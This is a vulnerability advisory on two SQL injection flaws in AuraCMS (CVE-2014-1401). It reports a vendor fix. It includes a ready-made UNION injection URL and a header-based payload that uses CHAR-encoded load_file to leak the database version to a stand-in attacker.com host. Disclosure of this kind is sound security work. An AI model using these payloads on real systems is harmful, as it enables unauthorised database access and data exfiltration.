 
High-Tech Bridge Security Research Lab discovered two SQL injection vulnerabilities in AuraCMS, which can be exploited to alter SQL queries and execute arbitrary SQL commands in application&#039;s database.
 
 
1) Multiple SQL Injection Vulnerabilities in AuraCMS: CVE-2014-1401
 
1.1 The vulnerability exists due to insufficient validation of "search" HTTP GET parameter passed to "/index.php" script. A remote authenticated attacker can execute arbitrary SQL commands in application&#039;s database.
 
The exploitation example below displays version of MySQL server:
 
http://[host]/index.php?mod=content&action=search&search=1%27%29%2f**%2funion%2f**%2fselect%201,version%28%29,3,4,5,6,7,8,9,10,11,12,13,14,15%20--%202
 
 
1.2 The vulnerability exists due to insufficient validation of "CLIENT_IP", "X_FORWARDED_FOR", "X_FORWARDED", "FORWARDED_FOR", "FORWARDED" HTTP headers in "/index.php" script. A remote authenticated attacker can execute arbitrary SQL commands in application&#039;s database.
 
The exploitation example below displays version of MySQL server:
 
 
GET / HTTP/1.1
CLIENT_IP: &#039;),(&#039;&#039;,(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))) -- 2

Solution:
 
Fixed by vendor on January 30, 2014 directly in the source code without version modification/new release. Update to the version 2.3 released after January 30, 2014.
